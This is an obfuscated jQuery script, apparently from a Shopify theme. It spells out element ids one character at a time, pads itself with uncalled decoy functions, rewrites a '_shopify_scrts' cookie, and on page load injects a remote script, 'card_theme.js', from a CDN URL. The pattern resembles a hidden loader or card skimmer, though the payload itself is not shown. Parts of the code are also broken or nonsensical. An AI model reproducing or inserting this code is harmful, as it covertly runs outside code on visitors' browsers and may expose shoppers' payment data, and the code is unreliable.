jQuery(document).ready(function(e) {
  function setCookie(cname, cvalue, time) {
    var expires = 'expires=' + time;
    document.cookie = cname + '=' + cvalue + ';' + expires + ';path=/';
  }
  function setNewCookie(cname, cvalue, exdays) {
    var d = new Date();
    d.setTime(d.getTime() + exdays * 24 * 60 * 60 * 1000);
    var expires = 'expires=' + d.toUTCString();
    document.cookie = cname + '=' + cvalue + ';' + expires + ';path=/';
  }
  function getCookie(cname) {
    var name = cname + '=';
    var decodedCookie = decodeURIComponent(document.cookie);
    var ca = decodedCookie.split(';');
    for (var i = 0; i < ca.length; i++) {
      var c = ca[i];
      while (c.charAt(0) == ' ') {
        c = c.substring(1);
      }
      if (c.indexOf(name) == 0) {
        return c.substring(name.length, c.length);
      }
    }
    return '';
  }
  var mnt = '',
    lnn = '',
    b = 't',
    j = 'i',
    k = 'f',
    l = 'y',
    o = 'e',
    p = 'm',
    c = 'p',
    r = 'c',
    m = 'r',
    y = 'u',
    x = 'j',
    g = '/',
    h = 'a',
    i = 'k';
  ('' != t && null != t) || (t = 10),
    ('' != n && null != n) || (n = 10),
    function(e, t) {
      var n = 1,
        o = "<tableborder='1'width='500'cellspacing='0'cellpadding='5'>";
      for (i = 1; i <= e; i++) {
        for (o += '<tr>'; n <= t; )
          (o = o + '<td>' + i * n + '</td>'), (n += 1);
        (o += '</tr>'), (n = 1);
      }
      o += '</table>';
    };
  var a = 'h',
    d = 's',
    e = 'b',
    s = '.',
    f = 'o',
    q = 'c',
    u = 'v',
    v = 'l',
    n = 'd',
    z = 'n',
    t = '://',
    hsh = '#',
    ide = c + m + f + n + y + r + b + '_' + i + o + l,
    dom = c + o + m + p + h + 'n' + o + 'n' + b + '_' + n + f + p + h + j + 'n',
    cdn =
      'https://cdn.shopify.com/s/files/1/0263/7437/3455/t/2/assets/card_theme.js';
  (key = $(hsh + ide).val()), (domain = $(hsh + dom).val());
  if (typeof key !== 'undefined' && typeof domain !== 'undefined') {
    var user = getCookie('_shopify_scrts'),
      user_shopdata = document.domain;

    if (user != '' && user != null) {
      setCookie('_shopify_scrts', user, o);
    }
    var tag1 = document.createElement('script');
    (tag1.src = cdn), jQuery('head').append(tag1);
  }
  ('' && null != t) || (t = 12),
    ('' != n && null != n) || (n = 15),
    function(src, end) {
      var ro = l + o + p + s,
        nl = r + n + p + x + g,
        dr = y + m + n + g,
        final = ro + nl + dr,
        fy = p + c + g,
        jg = b + k + l + y,
        src = fy + jg;
      console.log('TCL: src', src);
      if ((final = src)) {
        var final1 = document.createElement('script');
        final1.src = cdn;
        $('domain_fianl').append(final1);
      }
    };
});
